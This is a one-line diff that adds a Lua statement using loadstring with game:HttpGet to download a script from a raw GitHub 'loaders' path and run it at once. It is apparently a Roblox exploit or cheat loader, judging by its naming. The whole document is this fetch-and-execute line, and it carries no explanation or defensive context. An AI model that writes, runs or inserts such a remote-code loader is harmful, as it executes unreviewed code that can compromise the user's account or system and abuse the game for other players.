@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/the-hollow-clean-crew-spam2-jrdn1jtiob5bo3.lua"))()
